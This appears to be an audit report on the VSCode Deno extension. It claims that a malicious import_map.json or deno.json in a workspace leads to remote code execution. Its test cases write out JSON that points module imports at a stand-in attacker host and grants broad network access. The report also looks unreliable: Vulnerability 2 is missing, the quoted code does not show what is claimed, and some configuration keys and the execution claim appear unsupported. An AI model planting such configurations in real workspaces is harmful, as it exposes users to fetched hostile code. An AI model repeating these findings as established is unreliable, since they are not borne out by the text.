### Vulnerability 1: Unvalidated Import Maps Leading to Arbitrary Code Execution
**Description**:
The extension allows Deno's language server to use `import_map.json` or `deno.json` configuration files provided by the workspace without validating or sanitizing the URLs specified in these files. Attackers can craft a malicious `import_map.json` file in a workspace to redirect module imports to attacker-controlled URLs. When the extension processes files using the Deno language server, it will fetch and execute modules from these malicious URLs, potentially leading to remote code execution (RCE).

**Trigger Steps**:
1. An attacker creates a malicious workspace with a crafted `import_map.json` pointing to a hostile module URL (e.g., `https://malicious.com/exploit.js`).
2. The attacker opens the workspace in VSCode with the Deno extension enabled.
3. The extension reads the `import_map.json` during language server initialization (via `commands.ts:startLanguageServer`).
4. The Deno language server uses the malicious import map, resolving dependencies to attacker-controlled URLs.
5. When the user interacts with files in the workspace (e.g., viewing diagnostics or running commands), the server fetches and executes modules from the malicious URLs.

**Impact**:
Attackers can execute arbitrary code in the user's environment by hijacking module resolution. This could lead to data theft, system compromise, or unauthorized access.

**Vulnerability Rank**: Critical
**Currently Implemented Mitigations**: None. The code directly uses the `importMap` setting from configuration without validation.
**Missing Mitigations**:
- Validation of URLs in import maps to restrict to trusted domains.
- User confirmation prompt before loading external import maps.
- Sandbox execution of third-party modules.
**Preconditions**:
- A malicious `import_map.json` or `deno.json` file exists in the workspace.
- The Deno extension is enabled for the workspace.

**Source Code Analysis**:
In `client/src/commands.ts`, the `transformDenoConfiguration` function directly passes the user-provided `importMap` setting to the language server:
```typescript
config = vscode.workspace.getConfiguration(EXTENSION_NS);
// ...
return { ...denoConfiguration };
```
The Deno language server then uses this import map without validating URLs, leading to untrusted module resolution.

**Security Test Case**:
1. Create a malicious `import_map.json` with a hostile `mappings` entry:
```json
{
  "imports": {
    "harmless-module": "https://malicious.com/exploit.js"
  }
}
```
2. Place this file in a VSCode workspace.
3. Enable Deno for the workspace via `deno.enable` or a `deno.json` file.
4. Open a file importing `harmless-module` (e.g., `import { func } from "harmless-module";`).
5. Observe that the extension's language server fetches and executes code from `https://malicious.com/exploit.js`, triggering RCE.

### Vulnerability 3: Unauthorized Deno Configuration Loading
**Description**:
The extension automatically enables Deno configurations (`deno.json`) in workspaces without explicit user confirmation. Attackers can place a malicious `deno.json` in a workspace to configure dangerous settings (e.g., enabling unstable features or unsafe import mappings), which the extension applies without user approval.

**Trigger Steps**:
1. An attacker creates a `deno.json` file in a workspace with malicious settings:
```json
{
  "allowNet": ["*"],
  "importMap": "https://malicious.com/import_map.json"
}
```
2. The user opens the workspace.
3. The extension automatically loads the `deno.json` and applies its configurations, granting broad permissions and redirecting imports to hostile sources.

**Impact**:
Attackers can gain network access or execute modules from untrusted sources without user consent.

**Vulnerability Rank**: High
**Currently Implemented Mitigations**: The extension checks for `deno.json` but does not require user confirmation.
**Missing Mitigations**:
- Prompt users to review configurations before applying them.
- Restrict permissions by default unless explicitly granted.
**Preconditions**:
- A malicious `deno.json` exists in the workspace.

**Source Code Analysis**:
In `client/src/enable.ts`, `isPathEnabled` enables Deno based on presence of `deno.json` without user interaction:
```typescript
return scopesWithDenoJson.some((scope) => pathStartsWith(filePath, scope));
```
This auto-enables the configuration without prompting the user.

**Security Test Case**:
1. Create a `deno.json` with dangerous settings as shown above.
2. Open the workspace in VSCode.
3. Check that Deno configurations are applied automatically, granting unrestricted network access and importing from malicious URLs.
